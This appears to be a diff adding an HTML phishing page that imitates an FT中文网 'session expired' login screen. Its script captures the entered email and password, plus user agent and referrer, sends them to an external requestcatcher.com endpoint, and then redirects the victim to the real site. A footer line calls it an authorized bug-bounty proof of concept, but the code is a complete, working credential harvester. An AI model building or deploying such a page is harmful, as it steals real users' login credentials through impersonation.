@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FT中文网 - 会话已过期</title>
+<style>
+body { font-family: Helvetica,Arial,sans-serif; background: #fff1e0; margin:0; padding:40px; color:#262626; }
+.box { max-width:420px; margin:60px auto; background:#fff; padding:36px; border-radius:6px; box-shadow:0 2px 10px rgba(0,0,0,0.08); }
+.ft { font-weight:900; color:#036F6D; font-size:26px; letter-spacing:-1px; margin-bottom:6px; }
+.warn { color:#9e2f50; background:#fff0d8; padding:10px 14px; border-radius:3px; font-size:13px; margin:12px 0 20px; }
+label { display:block; font-size:12px; font-weight:bold; margin:16px 0 6px; }
+input { width:100%; padding:10px; font-size:15px; border:1px solid #d9d4c7; border-radius:3px; box-sizing:border-box; }
+button { width:100%; margin-top:20px; padding:12px; background:#036F6D; color:#fff; border:0; border-radius:3px; font-size:15px; cursor:pointer; font-weight:bold; }
+.bb { margin-top:16px; font-size:11px; color:#999; text-align:center; }
+</style>
+</head>
+<body>
+<div class="box">
+<div class="ft">FT中文网</div>
+<p class="warn">⚠ 您的会话已过期，请重新登录以继续访问您的账号。<br>Your session has expired. Please re-login to continue.</p>
+<form id="f" onsubmit="return send(event)">
+  <label>电子邮件 / Email</label>
+  <input id="email" type="email" required autofocus>
+  <label>密码 / Password</label>
+  <input id="pw" type="password" required>
+  <button type="submit">登录 / Log In</button>
+</form>
+<p id="status" style="margin-top:14px; font-size:12px; color:#666;"></p>
+<p class="bb">This page is an authorized bug-bounty PoC for FT HackerOne #TBD. No real credentials harvested — payload goes to the researcher-controlled requestcatcher endpoint.</p>
+</div>
+<script>
+const LOGGER_URL = 'https://ftc-phish-poc.requestcatcher.com/creds';
+async function send(e) {
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const pw = document.getElementById('pw').value;
+  const payload = { email, pw, ts: new Date().toISOString(), ua: navigator.userAgent, referrer: document.referrer, href: location.href };
+  document.getElementById('status').textContent = '正在验证… / Verifying…';
+  try {
+    await fetch(LOGGER_URL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+  } catch(err) {}
+  setTimeout(() => { window.location.href = 'https://www.ftchinese.com/myaccount'; }, 800);
+  return false;
+}
+console.log('[PoC] Attacker page loaded. Referrer:', document.referrer);
+</script>
+</body>
+</html>
